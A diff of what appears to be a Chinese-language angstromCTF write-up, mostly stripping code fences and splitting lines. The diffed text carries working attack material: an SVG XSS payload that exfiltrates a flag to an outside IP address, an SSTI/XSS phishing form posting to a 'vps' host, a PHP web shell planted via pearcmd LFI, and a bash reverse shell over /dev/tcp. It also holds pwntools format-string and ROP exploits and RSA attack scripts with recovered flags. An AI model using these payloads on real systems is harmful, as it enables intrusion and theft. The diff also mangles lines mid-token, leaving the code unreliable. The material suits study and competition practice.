@@ -97,7 +97,8 @@ cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
 
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
- <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
+ <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:
+5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
 </svg>
 
 数据包，要记得url编码，不然会被解码
@@ -196,7 +197,8 @@ if num_hosts == 1:
 
 GET / HTTP/2
 Host: flag.local
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+109.0) Gecko/20100101 Firefox/112.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
@@ -350,7 +352,8 @@ sla('Amount: ','48')
 sa('Contents: ',flat(
     {
     0:'%10$s',
-    16:elf.got.printf,
+    16:
+elf.got.printf,
     40-8:[
     0x404000+0xd00,
     0x401449
@@ -607,7 +610,7 @@ try:
  # 发送新字符串到服务器
  conn.sendline(new_string.encode())
 
- 
+
 except Exception as e:
  print(f"Exception: {e}")
  print("Last message from server:")
@@ -906,27 +909,13 @@ const swap3 = (x) => {
             };
 a=chunk("7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7", 30);
 swap3(a).join("")
-```
-
-
-
-```
 cards[id].type = type == "image/svg+xml" ? type : "text/plain";
 cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
-```
-
-
-
-```
 <svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
- <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
+ <script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('http://118.31.164.133:
+5555/?flag=' + xmlhttp.responseText)}};xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script>
 </svg>
-```
-
-
-
-```
 PUT /card HTTP/1.1
 Host: hallmark.web.actf.co
 Cache-Control: max-age=0
@@ -948,36 +937,16 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 1385
 
 id=c899ce6a-f5e8-4e42-ae5e-074f9c16c1c5&type[]=image/svg%2bxml&content=%3c%73%76%67%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%30%2f%73%76%67%22%20%76%65%72%73%69%6f%6e%3d%22%31%2e%31%22%3e%0d%0a%20%20%20%3c%63%69%72%63%6c%65%20%63%78%3d%22%31%30%30%22%20%63%79%3d%22%35%30%22%20%72%3d%22%34%30%22%20%73%74%72%6f%6b%65%3d%22%62%6c%61%63%6b%22%20%73%74%72%6f%6b%65%2d%77%69%64%74%68%3d%22%32%22%20%66%69%6c%6c%3d%22%72%65%64%22%20%2f%3e%0d%0a%20%20%20%3c%73%63%72%69%70%74%3e%78%6d%6c%68%74%74%70%3d%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%6d%6c%68%74%74%70%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%3d%74%72%75%65%3b%78%6d%6c%68%74%74%70%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%3d%66%75%6e%63%74%69%6f%6e%28%29%7b%69%66%28%78%6d%6c%68%74%74%70%2e%72%65%61%64%79%53%74%61%74%65%3d%3d%34%29%7b%77%69%6e%64%6f%77%2e%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%31%31%38%2e%33%31%2e%31%36%34%2e%31%33%33%3a%35%35%35%35%2f%3f%66%6c%61%67%3d%27%20%2b%20%78%6d%6c%68%74%74%70%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%7d%7d%3b%78%6d%6c%68%74%74%70%2e%6f%70%65%6e%28%27%47%45%54%27%2c%27%68%74%74%70%73%3a%2f%2f%68%61%6c%6c%6d%61%72%6b%2e%77%65%62%2e%61%63%74%66%2e%63%6f%2f%66%6c%61%67%27%2c%74%72%75%65%29%3b%78%6d%6c%68%74%74%70%2e%73%65%6e%64%28%29%3b%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%73%76%67%3e
-```
-
-
-
-```
 if len(request.args["message"]) >= 25:
-```
-
-
-
-```
-#https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test
+    #https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test
 
 if (!/^https://brokenlogin.web.actf.co/.*/.test(url)) return;
-```
-
-
-
-```
-#https://pptr.dev/api/puppeteer.page._eval
+    #https://pptr.dev/api/puppeteer.page._eval
 await page.$eval(
           "input[name=password]",
           (el, password) => (el.value = password),
           process.env.CHALL_BROKENLOGIN_FLAG
         );
-```
-
-
-
-```
 if "message" in request.args:
         if len(request.args["message"]) >= 25:
             return render_template_string(indexPage, fails=fails)
@@ -985,23 +954,8 @@ if "message" in request.args:
         custom_message = escape(request.args["message"])
     
     return render_template_string(indexPage % custom_message, fails=fails)
-```
-
-
-
-```
 ?message={{request.args|safe}}&<script>alert(1)</script>
-```
-
-
-
-```
 https://brokenlogin.web.actf.co/?message={{request.args|safe}}&r=%3Cform%20action=%22http://vps/%22%20method=%22POST%22%3E%3Clabel%20for=%22username%22%3EUsername:%20%3C/label%3E%3Cinput%20id=%22username%22%20type=%22text%22%20name=%22username%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Clabel%20for=%22password%22%3EPassword:%20%3C/label%3E%3Cinput%20id=%22password%22%20type=%22password%22%20name=%22password%22%20/%3E%3Cbr%20/%3E%3Cbr%20/%3E%3Cinput%20type=%22submit%22%20/%3E%3C/form%3E%3C!--
-```
-
-
-
-```
 if num_hosts == 1:
     for name, value in headers:
         if name == b"host" and value == SECRET_SITE:
@@ -1010,14 +964,10 @@ if num_hosts == 1:
                 'body': FLAG.encode(),
             })
             return
-```
-
-
-
-```
 GET / HTTP/2
 Host: flag.local
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+109.0) Gecko/20100101 Firefox/112.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
@@ -1029,33 +979,13 @@ Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: cross-site
 Sec-Fetch-User: ?1
 Te: trailers
-```
-
-
-
-```
 GET /?+config-create+/&f=../../../../usr/local/lib/php/pearcmd.php&/<?=eval($_GET[1])?>+/tmp/shell.php HTTP/1.1
-```
-
-
-
-```
 ?f=../../../../tmp/shell.php&1=echo `bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2Fvps%200%3E%261%27`;
-```
-
-
-
-```
 cp /tmp/sh /tmp/ls;
 echo "/bin/cat /flag.txt > /tmp/test" > /tmp/ls;
 export PATH=/tmp:$PATH;
 /list_uploads;
 cat /tmp/test;
-```
-
-
-
-```
 #!/usr/bin/env python3
 from pwncli import *
 cli_script()
@@ -1077,17 +1007,12 @@ sla("today?",pd)
 #0x312570243831250x3474737b667463610x75715f74695f6b630x615f74695f6575650x34373964613931360x7d32326234363863
 #1%p$81%4ts{ftcauq_ti_kca_ti_eue479da916}22b468c
 #4ts{ ftca -> actf{st4
-#uq_t i_kc -> ck_it_qu
-#a_ti _eue -> eue_it_a
+    #uq_t i_kc -> ck_it_qu
+    #a_ti _eue -> eue_it_a
 # 479d a916 -> 619ad974
 # }22b 468c -> c864b22}
-#actf{st4ck_it_queue_it_a619ad974c864b22}
+    #actf{st4ck_it_queue_it_a619ad974c864b22}
 ia()
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 from pwncli import *
@@ -1118,12 +1043,7 @@ pd = flat(
 
 sla('input:',pd)
 ia()
-#actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}
-```
-
-
-
-```
+    #actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}
 #!/usr/bin/env python3
 import subprocess
 from pwncli import *
@@ -1155,7 +1075,8 @@ sla('Amount: ','48')
 sa('Contents: ',flat(
     {
     0:'%10$s',
-    16:elf.got.printf,
+    16:
+elf.got.printf,
     40-8:[
     0x404000+0xd00,
     0x401449
@@ -1181,11 +1102,6 @@ s(flat(
 ))
 
 ia()
-```
-
-
-
-```
 #!/usr/bin/env python3
 import subprocess
 from pwncli import *
@@ -1225,11 +1141,6 @@ sa('Contents: ',flat(
 ))
 
 ia()
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 from pwncli import *
@@ -1340,11 +1251,6 @@ attack(retstack+0x18,pd)
 sl('0')
 
 ia()
-```
-
-
-
-```
 from socket import timeout
 from pwn import *
 
@@ -1378,7 +1284,7 @@ try:
  # 发送新字符串到服务器
  conn.sendline(new_string.encode())
 
- 
+
 except Exception as e:
  print(f"Exception: {e}")
  print("Last message from server:")
@@ -1387,11 +1293,6 @@ except Exception as e:
 
 # 关闭连接
 conn.close()
-```
-
-
-
-```
 from pwn import *
 p = remote('challs.actf.co',32760)
 
@@ -1406,17 +1307,7 @@ for i in range(len(a)):
 p.sendlineafter('word?n',c)
 
 p.interactive()
-```
-
-
-
-```
 actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}
-```
-
-
-
-```
 #!/usr/local/bin/python
 
 def fake_psi(a, b):
@@ -1450,11 +1341,6 @@ y = int(input("y: "))
 
 if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
     print(open("flag.txt").read())
-```
-
-
-
-```
 from Crypto.Util.number import getStrongPrime, bytes_to_long
 f = open("flag.txt").read()
 m = bytes_to_long(f.encode())
@@ -1468,11 +1354,6 @@ print("e =",e)
 print("c =",c)
 print("(p-2)*(q-1) =", (p-2)*(q-1))
 print("(p-1)*(q-2) =", (p-1)*(q-2))
-```
-
-
-
-```
 n = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230158509195522123739130077725744091649212709410268449632822394998403777113982287135909401792915941770405800840172214125677106752311001755849804716850482011237
 e = 65537
 c = 40544832072726879770661606103417010618988078158535064967318135325645800905492733782556836821807067038917156891878646364780739241157067824416245546374568847937204678288252116089080688173934638564031950544806463980467254757125934359394683198190255474629179266277601987023393543376811412693043039558487983367289
@@ -1487,12 +1368,7 @@ d=gmpy2.invert(e,(p-1)*(q-1))
 m=pow(c,d,n)
 from Crypto.Util.number import *
 print(long_to_bytes(m))
-#actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
-```
-
-
-
-```
+    #actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
 from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
 f = open("flag.txt").read()
 m = bytes_to_long(f.encode())
@@ -1514,11 +1390,6 @@ if c == m or b"actf{" in long_to_bytes(pow(c, d, n)):
     exit(1)
 
 print("m =", pow(c, d, n))
-```
-
-
-
-```
 from Crypto.Util.number import *
 n = 125599176571600020653591006850671918629969316481963062048627899456165392819660860740063083701116993746821677119724732749154516815660187428871607902333403883531995982511670779222688750122385320108285448513711360492525583823239144738204403791494094189914263158329757646207097685944406086316650210435629015580441
 e = 65537
@@ -1534,12 +1405,7 @@ def get_M():
             print(long_to_bytes(M))
             break
 get_M()
-#actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}
-```
-
-
-
-```
+    #actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}
 from pwn import *
 def jisuan(o,a0,M):
     p=''
@@ -1574,7 +1440,7 @@ for i in range(len(a)):
 for k in c:
     flag+=k
 print(flag)
-#actf{f80f6086a77b}
+    #actf{f80f6086a77b}
 ```
 
 
